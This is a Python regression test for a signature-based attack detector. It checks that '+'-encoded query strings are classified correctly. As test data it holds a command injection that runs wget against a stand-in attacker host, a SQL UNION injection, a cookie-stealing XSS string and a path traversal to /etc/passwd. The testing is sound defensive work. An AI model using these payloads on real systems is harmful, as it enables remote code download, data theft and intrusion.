"""
lab/verify_plus_encoding.py

Purpose: Regression check for '+'-encoded query strings (found live 2026-10-13).
         curl 8.x sends `--data-urlencode "q=; wget http://evil/x"` as
         `q=%3B+wget+http%3A%2F%2Fevil.example%2Fpayload` (space = '+'), and
         the signature detector only decoded %xx, so the command injection
         was not recognised by check_payload() and was then mislabelled
         SQLInjection by check_url() on the still-encoded ';'.

Confirms: (1) the '+'-encoded command injection is CommandInject, (2) the
          %20-encoded form still is, (3) '+'-encoded SQL injection, XSS and
          path traversal keep their correct labels, (4) a harmless '+'
          query stays clean, (5) the real captured request from the live
          test is CommandInject end to end through the pipeline's own
          URL fallback (check_url), not just check_payload.

Usage:
    python lab/verify_plus_encoding.py
"""
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import logging
logging.disable(logging.CRITICAL)

from detection.layer2_signatures import SignatureDetector

sd = SignatureDetector()


def req(query):
    return f"GET /search?q={query} HTTP/1.1\r\nHost: 192.168.0.101\r\nUser-Agent: curl/8.21.0\r\nAccept: */*\r\n\r\n"


def kind(query):
    return sd.check_payload(req(query))["attack_type"]


print("--- Check 1: '+'-encoded command injection (the live miss) ---")
assert kind("%3B+wget+http%3A%2F%2Fevil.example%2Fpayload") == "CommandInject", kind("%3B+wget+http%3A%2F%2Fevil.example%2Fpayload")
print("PASS")

print("--- Check 2: %20-encoded form still CommandInject ---")
assert kind("%3B%20wget%20http%3A%2F%2Fevil.example%2Fpayload") == "CommandInject"
print("PASS")

print("--- Check 3: other attack types keep their labels with '+' encoding ---")
assert kind("%27+UNION+SELECT+NULL--") == "SQLInjection", kind("%27+UNION+SELECT+NULL--")
assert kind("%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E") == "XSS"
assert kind("..%2F..%2F..%2F..%2Fetc%2Fpasswd") == "PathTraversal"
print("PASS")

print("--- Check 4: harmless '+' query stays clean ---")
assert not sd.check_payload(req("hello+world+how+are+you"))["detected"]
assert not sd.check_payload(req("hello"))["detected"]
print("PASS")

print("--- Check 5: URL fallback no longer mislabels the encoded ';' as SQLi ---")
url = "http://127.0.0.1/search?q=%3B+wget+http%3A%2F%2Fevil.example%2Fpayload"
assert sd.check_url(url)["attack_type"] != "SQLInjection", sd.check_url(url)
print("PASS")

print("\nAll checks passed.")
